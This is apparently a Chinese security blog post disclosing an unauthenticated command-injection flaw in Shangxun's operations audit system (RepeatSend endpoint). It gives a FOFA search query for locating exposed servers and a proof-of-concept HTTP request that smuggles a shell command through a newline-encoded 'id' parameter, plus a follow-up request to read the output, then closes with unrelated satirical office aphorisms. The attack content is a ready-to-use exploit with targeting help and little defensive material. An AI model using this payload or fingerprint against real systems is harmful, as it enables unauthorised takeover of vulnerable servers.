#  上讯信息技术股份有限公司运维管理系统RepeatSend命令执行漏洞   
 sec0nd安全   2025-05-18 15:15  
  
   
  
> 字数 335，阅读大约需 2 分钟  
  
## 漏洞简介  
  
上讯信息运维管理审计系统 repeatsend 远程命令执行，未经身份验证的远程攻击者可利用此漏洞写入后门文件，执行任意命令，导致服务器被控。  
## FOFA  
```
body="default/getloginhtml"
```  
## POC  
```
POST /emailapply/RepeatSend HTTP/1.1Host: Content-Type: application/x-www-form-urlencodedConnection: closeUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.850.86 Safari/537.36id='%0id > 123.txt%0a'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBWfKzr6BWLso0xuwpGE8ibhavPG4Xn4QODibj6UzLvVZd9cD1U0sXpHjCU7N4BmFg9GKnURjDqicZ5g/640?from=appmsg "null")  
  
```
GET /123.txt HTTP/1.1Host: 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBWfKzr6BWLso0xuwpGE8ibhVBStvDkVoX3h3pHjYRRwuaow8vibXpWp5KCJxIgNOPUSKmiayxFrsANQ/640?from=appmsg "null")  
  
  
噢，对了这个漏洞没用到代码审计的技能，只不过是前人栽树后人乘凉罢了。  
  
懂的都懂  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBWfKzr6BWLso0xuwpGE8ibhO1DeYbfwgA2sHgHtrh18fwKqjRqATlrd6xRbyzw1mBVaicNfsfUSUmA/640?from=appmsg "null")  
  
## 鸡汤  
- • 每个Excel单元格都是全景监狱的微型模型  
  
- • 在KPI炼金术里，灵魂正被批量转化为可交易金属  
  
- • 茶水间的窃语是福柯笔下的规训回音壁  
  
- • 周报里的虚假数据正在书写新资本论补遗  
  
- • 工位隔板构成汉娜·阿伦特式的平庸之恶矩阵  
  
- • 晋升阶梯的每一阶都浇筑着海德格尔说的"常人"骨灰  
  
- • 会议室的单向镜后，鲍德里亚的拟像正在直播  
  
- • 钉钉提示音是数字泰勒主义的弥赛亚召唤  
  
- • 年终奖数字成为存在主义焦虑的二进制封印  
  
- • 这场永续的办公室政治，本质是资本精心设计的斗兽场 placebo  
  
  
  
   
  
  
